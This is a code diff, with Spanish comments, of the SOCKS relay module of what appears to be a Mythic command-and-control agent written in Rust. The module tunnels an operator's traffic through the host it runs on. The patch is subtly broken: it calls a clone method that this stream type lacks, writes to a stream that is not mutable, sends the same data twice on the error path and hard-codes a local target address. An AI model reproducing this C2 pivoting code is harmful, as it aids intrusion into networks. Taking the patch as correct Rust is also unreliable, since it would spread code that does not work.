@@ -8,15 +8,14 @@ use std::sync::{mpsc, Arc, Mutex};
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::TcpStream;
 
-#[derive(Deserialize, Serialize, Debug, Clone)]  // ← AGREGA Serialize y Debug
+#[derive(Deserialize, Serialize, Debug, Clone)]
 pub struct SocksMsg {
     pub exit: bool,
     pub server_id: u32,
     pub data: String,
 }
 
-// Define SocksState aquí con Debug
-#[derive(Debug)]  // ← AGREGA Debug
+#[derive(Debug)]
 pub struct SocksState {
     pub connections: Arc<Mutex<Vec<(u32, TcpStream)>>>,
     pub outbound: Arc<Mutex<Vec<SocksMsg>>>,
@@ -31,11 +30,8 @@ impl SocksState {
     }
 }
 
-// Asegúrate de que start_socks esté definida correctamente
 pub fn start_socks(tx: &mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>) -> Result<(), Box<dyn Error>> {
     let task: AgentTask = serde_json::from_value(rx.recv()?)?;
-    
-    // Usa mythic_error con status "success" para indicar éxito
     tx.send(mythic_error!(task.id, "SOCKS relay started"))?;
 
     let rt = tokio::runtime::Runtime::new()?;
@@ -43,7 +39,7 @@ pub fn start_socks(tx: &mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serd
     Ok(())
 }
 
-async fn relay_loop(tx: mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>) {  // ← QUITA el mut
+async fn relay_loop(tx: mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>) {
     while let Ok(msg) = rx.recv() {
         if let Ok(task) = serde_json::from_value::<AgentTask>(msg) {
             if task.command == "socks_data" {
@@ -66,18 +62,31 @@ async fn process_messages(tx: &mpsc::Sender<serde_json::Value>, msgs: Vec<SocksM
             continue;
         }
 
-        let data = decode(&msg.data).unwrap_or_default();  // ← USA decode directamente
+        let data = decode(&msg.data).unwrap_or_default();
         
         if let Some(pos) = conns.iter().position(|(id, _)| *id == msg.server_id) {
             let (_, stream) = &mut conns[pos];
             let _ = stream.write_all(&data).await;
         } else {
-            if let Ok(mut stream) = TcpStream::connect("127.0.0.1:80").await {
-                // Escribe los datos primero antes de spawnear la tarea
+            if let Ok(stream) = TcpStream::connect("127.0.0.1:80").await {
+                // CORRECCIÓN: Primero escribimos los datos
                 let _ = stream.write_all(&data).await;
-                let stream_clone = stream;  // ← USA el stream directamente
-                tokio::spawn(relay_stream(msg.server_id, stream_clone, tx.clone()));
-                conns.push((msg.server_id, stream));
+                
+                // CORRECCIÓN: Clonamos el stream usando try_clone() y manejamos el error
+                match stream.try_clone() {
+                    Ok(stream_clone) => {
+                        // Agregamos el stream original al vector de conexiones
+                        conns.push((msg.server_id, stream));
+                        
+                        // Spawneamos la tarea con el clon
+                        tokio::spawn(relay_stream(msg.server_id, stream_clone, tx.clone()));
+                    }
+                    Err(e) => {
+                        eprintln!("Failed to clone stream: {}", e);
+                        // Si no podemos clonar, aún podemos usar el stream para esta operación
+                        let _ = stream.write_all(&data).await;
+                    }
+                }
             }
         }
     }
@@ -99,7 +108,7 @@ async fn relay_stream(id: u32, mut stream: TcpStream, tx: mpsc::Sender<serde_jso
         match stream.read(&mut buf).await {
             Ok(0) => break,
             Ok(n) => {
-                let data = encode(&buf[..n]);  // ← USA encode directamente
+                let data = encode(&buf[..n]);
                 let msg = SocksMsg { exit: false, server_id: id, data };
                 let json = serde_json::to_string(&vec![msg]).unwrap();
                 let _ = tx.send(serde_json::json!({
